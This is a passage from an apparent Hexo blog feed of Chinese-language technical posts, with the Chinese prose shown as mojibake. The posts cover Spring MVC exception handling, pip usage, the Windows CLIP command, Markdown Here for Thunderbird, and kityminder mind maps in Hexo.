class="comment"> * &lt;p&gt;This exception resolver is enabled by default in the &#123;<span class="doctag">@link</span> org.springframework.web.portlet.DispatcherPortlet&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Arjen Poutsma</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Juergen Hoeller</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 3.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationMethodHandlerExceptionResolver</span> <span class="keyword">extends</span> <span class="title">AbstractHandlerExceptionResolver</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">doResolveException</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            PortletRequest request, MimeResponse response, Object handler, Exception ex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (handler != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Method handlerMethod = findBestExceptionHandlerMethod(handler, ex);</span><br><span class="line">            <span class="keyword">if</span> (handlerMethod != <span class="keyword">null</span>) &#123;</span><br><span class="line">                NativeWebRequest webRequest = <span class="keyword">new</span> PortletWebRequest(request, response);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object[] args = resolveHandlerArguments(handlerMethod, handler, webRequest, ex);</span><br><span class="line">                    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                        logger.debug(<span class="string">"Invoking request handler method: "</span> + handlerMethod);</span><br><span class="line">                    &#125;</span><br><span class="line">                    Object retVal = doInvokeMethod(handlerMethod, handler, args);</span><br><span class="line">                    <span class="keyword">return</span> getModelAndView(retVal);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception invocationEx) &#123;</span><br><span class="line">                    logger.error(<span class="string">"Invoking request method resulted in exception : "</span> + handlerMethod, invocationEx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å’Œæ™®é€šçš„å¤„ç†ç±»ä¼¼ï¼Œä»æ‰€æœ‰æ ‡æ³¨äº†<code>@ExceptionHandler</code>çš„æ–¹æ³•ä¸­æ‰¾åˆ°æœ€ä½³åŒ¹é…ï¼Œç„¶åè§£æå‚æ•°ï¼Œè°ƒç”¨ã€‚</p>
<h2 id="webå®¹å™¨çš„é”™è¯¯å¤„ç†"><a href="#webå®¹å™¨çš„é”™è¯¯å¤„ç†" class="headerlink" title="webå®¹å™¨çš„é”™è¯¯å¤„ç†"></a>webå®¹å™¨çš„é”™è¯¯å¤„ç†</h2><p><code>WEB-INF/web.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/Error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Exception<span class="tag">&lt;/<span class="name">exception-type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/Error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>locationä¸­çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªjspï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªURLï¼ˆåŒ…æ‹¬<code>@Controller</code>æ³¨è§£çš„ï¼‰</p>
<p>å¤„ç†errorçš„Controllerç¤ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(path = <span class="string">"/error"</span>, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">handle</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        map.put(<span class="string">"status"</span>, request.getAttribute(<span class="string">"javax.servlet.error.status_code"</span>));</span><br><span class="line">        map.put(<span class="string">"reason"</span>, request.getAttribute(<span class="string">"javax.servlet.error.message"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JSPç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;application/json&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&#123;</span><br><span class="line">status:&lt;%=request.getAttribute(&quot;javax.servlet.error.status_code&quot;) %&gt;,</span><br><span class="line">reason:&lt;%=request.getAttribute(&quot;javax.servlet.error.message&quot;) %&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://www.cnblogs.com/hupengcool/p/4586910.html" rel="external nofollow noopener noreferrer" target="_blank">SpringMVC å¼‚å¸¸å¤„ç† - çºµé…’æŒ¥åˆ€æ–©äººå¤´ - åšå®¢å›­</a></p>
</li>
<li><p><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/html/mvc.html#mvc-exceptionhandlers" rel="external nofollow noopener noreferrer" target="_blank">22. Web MVC framework</a></p>
</li>
<li><p><a href="http://howtodoinjava.com/spring/spring-mvc/spring-mvc-simplemappingexceptionresolver-example/" rel="external nofollow noopener noreferrer" target="_blank">Spring MVC Mapping Exceptions to Views Example | Spring MVC SimpleMappingExceptionResolver Example</a></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/15987212/custom-error-page-in-tomcat-7-for-error-code-500" rel="external nofollow noopener noreferrer" target="_blank">java - Custom Error Page in Tomcat 7 for Error Code 500 - Stack Overflow</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> exception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pipä½¿ç”¨]]></title>
      <url>http://qsli.github.io/2017/01/08/pip/</url>
      <content type="html"><![CDATA[<h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>ä¸‹è½½å®‰è£…æ–‡ä»¶, <a href="https://bootstrap.pypa.io/get-pip.py" rel="external nofollow noopener noreferrer" target="_blank"></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure>
<h3 id="ä»åˆ—è¡¨æ–‡ä»¶å®‰è£…"><a href="#ä»åˆ—è¡¨æ–‡ä»¶å®‰è£…" class="headerlink" title="ä»åˆ—è¡¨æ–‡ä»¶å®‰è£…"></a>ä»åˆ—è¡¨æ–‡ä»¶å®‰è£…</h3><p>å¯¼å‡ºæ–‡ä»¶åˆ—è¡¨(ä¸€èˆ¬é…åˆvirtualenvé€‚åº”)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pip freeze                               </span><br><span class="line">backports-abc==0.4                         </span><br><span class="line">backports.shutil-get-terminal-size==1.0.0  </span><br><span class="line">backports.ssl-match-hostname==3.5.0.1      </span><br><span class="line">beautifulsoup4==4.5.1                      </span><br><span class="line">bs4==0.0.1                                 </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä¸€èˆ¬å«åšrequirements.txt</p>
<p>ç„¶åå®‰è£…çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<h3 id="å®‰è£…VCSä¸Šçš„è½¯ä»¶"><a href="#å®‰è£…VCSä¸Šçš„è½¯ä»¶" class="headerlink" title="å®‰è£…VCSä¸Šçš„è½¯ä»¶"></a>å®‰è£…VCSä¸Šçš„è½¯ä»¶</h3><blockquote>
<p>pip currently supports cloning over git, git+http, git+https, git+ssh, git+git and git+file:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[-e] git://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+http://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+https://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+ssh://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+git://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+file://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">-e git+git@git.myproject.org:MyProject#egg=MyProject</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="https://pip.pypa.io/en/stable/reference/pip_install/#vcs-support" rel="external nofollow noopener noreferrer" target="_blank">pip install â€” pip 9.0.1 documentation</a></p>
</li>
<li><p><a href="https://segmentfault.com/a/1190000003050954" rel="external nofollow noopener noreferrer" target="_blank">Django | requirement.txt ç”Ÿæˆ - é»‘æœˆäº® - SegmentFault</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pip </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[windowså‘½ä»¤æ“ä½œå‰ªè´´æ¿â€”â€”CLIP]]></title>
      <url>http://qsli.github.io/2017/01/07/CLIP/</url>
      <content type="html"><![CDATA[<h2 id="ä½¿ç”¨è¯´æ˜"><a href="#ä½¿ç”¨è¯´æ˜" class="headerlink" title="ä½¿ç”¨è¯´æ˜"></a>ä½¿ç”¨è¯´æ˜</h2><blockquote>
<p>CLIP</p>
</blockquote>
<blockquote>
<p>Description:<br>    Redirects output of command line tools to the Windows clipboard.<br>    This text output can then be pasted into other programs.</p>
</blockquote>
<blockquote>
<p>Parameter List:<br>    /?                  Displays this help message.</p>
</blockquote>
<blockquote>
<p>Examples:<br>    DIR | CLIP          Places a copy of the current directory<br>                        listing into the Windows clipboard.</p>
</blockquote>
<blockquote>
<p>   CLIP &lt; README.TXT   Places a copy of the text from readme.txt<br>                        on to the Windows clipboard.</p>
</blockquote>
<h2 id="ç®€å•åº”ç”¨"><a href="#ç®€å•åº”ç”¨" class="headerlink" title="ç®€å•åº”ç”¨"></a>ç®€å•åº”ç”¨</h2><h3 id="å°†ipåœ°å€æ‹·è´åˆ°å‰ªè´´æ¿"><a href="#å°†ipåœ°å€æ‹·è´åˆ°å‰ªè´´æ¿" class="headerlink" title="å°†ipåœ°å€æ‹·è´åˆ°å‰ªè´´æ¿"></a>å°†ipåœ°å€æ‹·è´åˆ°å‰ªè´´æ¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig | find <span class="string">"IPv4"</span> | find /V <span class="string">"è‡ªåŠ¨"</span>  | find /V <span class="string">"Auto"</span> | awk <span class="string">"&#123; print <span class="variable">$(NF)</span>;&#125;"</span> | CLIP</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥æ·»åŠ ä¸€ä¸ªaliasï¼Œè¿™æ ·å°±ä¸ç”¨æ¯æ¬¡æ•²<code>ipconfig</code>, ç„¶åå¤åˆ¶ipäº†</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="http://superuser.com/questions/382265/fastest-method-to-determine-my-pcs-ip-address-windows" rel="external nofollow noopener noreferrer" target="_blank">Fastest method to determine my PCâ€™s IP address (Windows) - Super User</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
        <tags>
            
            <tag> å‰ªè´´æ¿ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ThunderBirdä½¿ç”¨Markdownå†™é‚®ä»¶]]></title>
      <url>http://qsli.github.io/2017/01/02/markdown-here/</url>
      <content type="html"><![CDATA[<h1 id="Thunderbird"><a href="#Thunderbird" class="headerlink" title="Thunderbird"></a>Thunderbird</h1><p><img src="https://www.mozilla.org/media/img/thunderbird/landing/wordmark.3b0e03fa56f1.png" alt></p>
<p>æ˜¯MozillaåŸºé‡‘æ¨å‡ºçš„å…è´¹ã€å¼€æºçš„é‚®ä»¶å®¢æˆ·ç«¯ï¼Œå®ƒæ”¯æŒlinuxã€macå’Œwindowsã€‚</p>
<p>è¿™ä¸ªå®¢æˆ·ç«¯çœ‹èµ·æ¥å’Œç«ç‹éå¸¸åƒï¼Œä¹Ÿæ”¯æŒæ’ä»¶æ‰©å±•ã€‚</p>
<h1 id="markdown-here"><a href="#markdown-here" class="headerlink" title="markdown here"></a>markdown here</h1><p>markdown hereä¾¿æ˜¯å€ŸåŠ©markdownçš„åŠ›é‡æ¥ç¼–å†™é‚®ä»¶ã€‚ä»–åœ¨Chromeã€Firefoxã€Safariä¸Šéƒ½æœ‰æ’ä»¶ã€‚</p>
<p>Thunderbirdä¸­çš„æ’ä»¶ï¼š</p>
<img src="/2017/01/02/markdown-here/additional.jpg" title="æ’ä»¶">
<p>æ’ä»¶å®‰è£…å¥½ä¹‹åï¼Œåœ¨ç¼–å†™gmailç­‰æ”¯æŒå¯Œæ–‡æœ¬ç¼–è¾‘å™¨çš„æ—¶å€™å°±å¯ä»¥å°†markdownè½¬æ¢æˆç›¸åº”çš„æ ·å¼ã€‚</p>
<p>markdown hereä¹Ÿæä¾›äº†Thunderbirdçš„æ’ä»¶ï¼Œåœ¨é™„åŠ ç»„ä»¶ä¸­å®‰è£…é‡å¯åå³å¯ä½¿ç”¨markdownæ¥ç¼–è¾‘ï¼Œ</p>
<p>ç¼–å†™å®Œæˆåï¼Œç‚¹å‡»å·¥å…·æ çš„å›¾æ ‡å³å¯è¿›è¡Œè½¬æ¢ã€‚</p>
<img src="/2017/01/02/markdown-here/mail.jpg" title="ç¼–å†™é‚®ä»¶">
<p>è½¬æ¢çš„æ ·å¼ä¹Ÿå¯ä»¥åœ¨è®¾ç½®ä¸­è‡ªå·±å®šä¹‰ã€‚</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>1.<a href="http://www.yangzhiping.com/tech/markdown-tips.html" rel="external nofollow noopener noreferrer" target="_blank">Markdownå°æŠ€å·§é›†åˆ - é˜³å¿—å¹³çš„ç½‘å¿—</a></p>
<p>2.<a href="http://markdown-here.com/" rel="external nofollow noopener noreferrer" target="_blank">Markdown Here</a></p>
]]></content>
      
        <categories>
            
            <category> markdown </category>
            
        </categories>
        
        
        <tags>
            
            <tag> markdown-here </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexoä¸­ä½¿ç”¨markdownæ¥ç»˜åˆ¶è„‘å›¾ï¼ˆmind mapï¼‰]]></title>
      <url>http://qsli.github.io/2017/01/01/markdown-mindmap/</url>
      <content type="html"><![CDATA[<h1 id="è„‘å›¾æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è„‘å›¾æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è„‘å›¾æ˜¯ä»€ä¹ˆï¼Ÿ"></a>è„‘å›¾æ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>è„‘å›¾è‹±æ–‡å«åš<code>mind map</code>, æ˜¯ä¸€ç§å¸®åŠ©å‘æ•£æ€ç»´çš„å·¥å…·ã€‚å°†è¯»è¿‡çš„ä¹¦ã€çœ‹è¿‡çš„æºç ç­‰æ€»ç»“æˆè„‘å›¾ï¼Œç­‰ä¸‹æ¬¡éœ€è¦å¤ä¹ çš„æ—¶å€™</p>
<p>é¡ºç€è„‘å›¾å»çœ‹ï¼Œæ•ˆç‡éå¸¸é«˜ã€‚</p>
<img src="/2017/01/01/markdown-mindmap/sample.jpg">
<h2 id="ç”¨makrdownæ¥ç”»è„‘å›¾"><a href="#ç”¨makrdownæ¥ç”»è„‘å›¾" class="headerlink" title="ç”¨makrdownæ¥ç”»è„‘å›¾"></a>ç”¨makrdownæ¥ç”»è„‘å›¾</h2><p><code>markdown</code>æ˜¯ä¸€ç§éå¸¸æ–¹ä¾¿çš„æ ‡è®°æ€§è¯­è¨€ï¼Œä½¿ç”¨<code>markdown</code>è®°å½•å¯ä»¥å¿½ç•¥æ ¼å¼å¸¦æ¥çš„å›°æ‰°ï¼Œè®©æˆ‘ä»¬æ›´åŠ çš„ä¸“æ³¨äºå†…å®¹ã€‚</p>
<p>è„‘å›¾çš„ç»“æ„ä¹Ÿä¸å¤æ‚ï¼Œå°±æ˜¯ä¸€çº§ä¸€çº§çš„åˆ†æ”¯ã€‚ä½¿ç”¨markdownå®Œå…¨å¯ä»¥è¡¨è¾¾å‡ºæ¥ï¼Œå…³é”®æ˜¯æ€ä¹ˆæ¸²æŸ“å‡ºæ¥ã€‚</p>
<h2 id="kityminder"><a href="#kityminder" class="headerlink" title="kityminder"></a>kityminder</h2><p>ç»å¤šç•ªæŸ¥æ‰¾ï¼Œæœ€ç»ˆé”å®šäº†ç™¾åº¦å‰ç«¯å›¢é˜Ÿå¼€æºçš„â€”â€”<code>kityminder</code>, <a href="http://naotu.baidu.com/" rel="external nofollow noopener noreferrer" target="_blank">ç™¾åº¦è„‘å›¾</a>ä¹Ÿæ˜¯ä½¿ç”¨è¿™ä¸ªæ„å»ºçš„ã€‚</p>
<p><code>kityminder</code>åˆ†æˆäº†ä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯<a href="https://github.com/fex-team/kityminder-core" rel="external nofollow noopener noreferrer" target="_blank">kityminder-core</a>,ä¸€ä¸ªæ˜¯<a href="https://github.com/fex-team/kityminder-editor" rel="external nofollow noopener noreferrer" target="_blank">kityminder-editor</a>.</p>
<img src="/2017/01/01/markdown-mindmap/relations.png">
<h3 id="kityminder-core"><a href="#kityminder-core" class="headerlink" title="kityminder-core"></a>kityminder-core</h3><p>kityminder-coreæ˜¯ç™¾åº¦è„‘å›¾æœ€æ ¸å¿ƒéƒ¨åˆ†çš„å®ç°ï¼Œä¸»è¦åŒ…æ‹¬äº†:</p>
<ul>
<li><p>åŒ…æ‹¬è„‘å›¾æ•°æ®çš„å¯è§†åŒ–å±•ç¤ºï¼ˆJson æ ¼å¼ï¼‰</p>
</li>
<li><p>åŒ…æ‹¬ç®€å•çš„ç¼–è¾‘åŠŸèƒ½ï¼ˆèŠ‚ç‚¹åˆ›å»ºã€ç¼–è¾‘ã€åˆ é™¤ï¼‰ã€‚æ›´åŠ å¼ºå¤§ç¼–è¾‘åŠŸèƒ½çš„ KityMinder ç¼–è¾‘å™¨è¯·ç§»æ­¥ kityminder-editor</p>
</li>
<li><p>ä¸åŒ…å«ç¬¬ä¸‰æ–¹æ ¼å¼ï¼ˆFreeMindã€XMindã€MindManagerï¼‰çš„æ”¯æŒï¼Œå¯ä»¥åŠ è½½ kityminder-protocol æ¥æ‰©å±•ç¬¬ä¸‰æ–¹æ ¼å¼æ”¯æŒã€‚</p>
</li>
<li><p>ä¸åŒ…å«æ–‡ä»¶å­˜å‚¨çš„æ”¯æŒï¼Œéœ€è¦è‡ªè¡Œå®ç°å­˜å‚¨ã€‚å¯å‚ç…§ç™¾åº¦è„‘å›¾ä¸­çš„å¼€æºçš„ fio + ç™¾åº¦ç½‘ç›˜æ–¹æ¡ˆè¿›è¡Œå®ç°ã€‚</p>
</li>
</ul>
<h3 id="kityminder-editor"><a href="#kityminder-editor" class="headerlink" title="kityminder-editor"></a>kityminder-editor</h3><blockquote>
<p>KityMinder Editor æ˜¯ä¸€æ¬¾å¼ºå¤§ã€ç®€æ´ã€ä½“éªŒä¼˜ç§€çš„è„‘å›¾ç¼–è¾‘å·¥å…·ï¼Œé€‚åˆç”¨äºç¼–è¾‘æ ‘/å›¾/ç½‘ç­‰ç»“æ„çš„æ•°æ®ã€‚</p>
</blockquote>
<blockquote>
<p>ç¼–è¾‘å™¨ç”±ç™¾åº¦ FEX åŸºäº kityminder-core æ­å»ºï¼Œå¹¶ä¸”åœ¨ç™¾åº¦è„‘å›¾ä¸­ä½¿ç”¨ã€‚</p>
</blockquote>
<h2 id="è®©hexoæ”¯æŒkityminder"><a href="#è®©hexoæ”¯æŒkityminder" class="headerlink" title="è®©hexoæ”¯æŒkityminder"></a>è®©hexoæ”¯æŒkityminder</h2><p>è¿™ä¸ªä¸»è¦æ˜¯å®¢æˆ·ç«¯æ¸²æŸ“çš„ã€‚</p>
<h3 id="å¼•å…¥ä¾èµ–"><a href="#å¼•å…¥ä¾èµ–" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h3><p>å¼•å…¥<code>kityminder-core</code>çš„jså’Œcssï¼Œä»¥åŠ<code>kityminder-core</code>çš„ä¾èµ–kityåˆ°ç›¸åº”çš„ä¸»é¢˜ä¸‹é¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//coreå‹ç¼©åçš„</span><br><span class="line">kityminder.core.min.js</span><br><span class="line">//kityçš„cdnåœ°å€</span><br><span class="line">https://cdn.rawgit.com/fex-team/kity/dev/dist/kity.min.js</span><br></pre></td></tr></table></figure>
<h3 id="ä¸ºmind-mapæ‰¾åˆ°ä¸€ä¸ªæ ‡ç­¾"><a href="#ä¸ºmind-mapæ‰¾åˆ°ä¸€ä¸ªæ ‡ç­¾" class="headerlink" title="ä¸ºmind mapæ‰¾åˆ°ä¸€ä¸ªæ ‡ç­¾"></a>ä¸º<code>mind map</code>æ‰¾åˆ°ä¸€ä¸ªæ ‡ç­¾</h3><p>æ¸²æŸ“éœ€è¦<em>æ•°æ®</em>å’Œ<em>å®¹å™¨</em>èŠ‚ç‚¹ã€‚æ•°æ®çš„æ ‡è®°åº”è¯¥è¶Šç®€å•è¶Šå¥½ã€‚</p>
<p>æŸ¥é˜…hexoçš„å®˜æ–¹æ–‡æ¡£ï¼Œå‘ç°äº†å‡ ä¸ªæ”¯æŒè®¾ç½®classå±æ€§çš„æ ‡ç­¾ï¼Œä»¥åŠrawæ ‡ç­¾ã€‚</p>
<p>å…ˆæ¥çœ‹çœ‹<code>raw</code>æ ‡ç­¾ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
<p><code>raw</code>æ ‡ç­¾é‡Œé¢æ˜¯å¯ä»¥å†™htmlçš„ï¼Œæ¸²æŸ“çš„æ—¶å€™ä¸ä¼šåŠ ä»¥æ”¹å˜ï¼Œä½†æ˜¯å†™èµ·äº†æ¯”è¾ƒéº»çƒ¦ï¼Œå¤±å»äº†æ ‡è®°æ€§è¯­è¨€ç®€å•çš„ç‰¹æ€§ã€‚</p>
<p><code>pull quote</code>æ ‡ç­¾ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pullquote [class] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure>
<p><code>pull quote</code> æ ‡ç­¾æ”¯æŒè®¾ç½®classå±æ€§ï¼Œä½¿ç”¨è¿™ä¸ªæ ‡ç­¾ï¼Œç„¶åè®¾ç½®ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„classï¼Œæ¯”å¦‚<code>mindmap</code></p>
<h3 id="æ¸²æŸ“æ•°æ®"><a href="#æ¸²æŸ“æ•°æ®" class="headerlink" title="æ¸²æŸ“æ•°æ®"></a>æ¸²æŸ“æ•°æ®</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> minder = <span class="keyword">new</span> kityminder.Minder(&#123;</span><br><span class="line">            renderTo: <span class="string">'.mindmap'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">var</span> markdownText = $(<span class="string">'.mindmap'</span>).text().trim();</span><br><span class="line">        $(<span class="string">'.mindmap p'</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index, element</span>) </span>&#123;</span><br><span class="line">            element.style.display = <span class="string">'none'</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        minder.importData(<span class="string">'markdown'</span>, markdownText);</span><br><span class="line">        minder.disable();</span><br><span class="line">        minder.execCommand(<span class="string">'hand'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">3000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨markdownå†™mind mapç¤ºä¾‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pullquote mindmap %&#125;</span><br><span class="line">#ä¸»é¢˜</span><br><span class="line">##ä¸€çº§åˆ†æ”¯</span><br><span class="line">###äºŒçº§åˆ†æ”¯</span><br><span class="line">##ä¸€çº§åˆ†æ”¯</span><br><span class="line">##ä¸€çº§åˆ†æ”¯</span><br><span class="line">###äºŒçº§åˆ†æ”¯</span><br><span class="line">####ä¸‰çº§åˆ†æ”¯</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure>
<p>æ¸²æŸ“çš„æ•ˆæœ</p>
<blockquote class="pullquote mindmap"><p>#ä¸»é¢˜</p>
<p>##ä¸€çº§åˆ†æ”¯</p>
<p>###äºŒçº§åˆ†æ”¯</p>
<p>##ä¸€çº§åˆ†æ”¯</p>
<p>##ä¸€çº§åˆ†æ”¯</p>
<p>###äºŒçº§åˆ†æ”¯</p>
<p>####ä¸‰çº§åˆ†æ”¯</p>
</blockquote>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
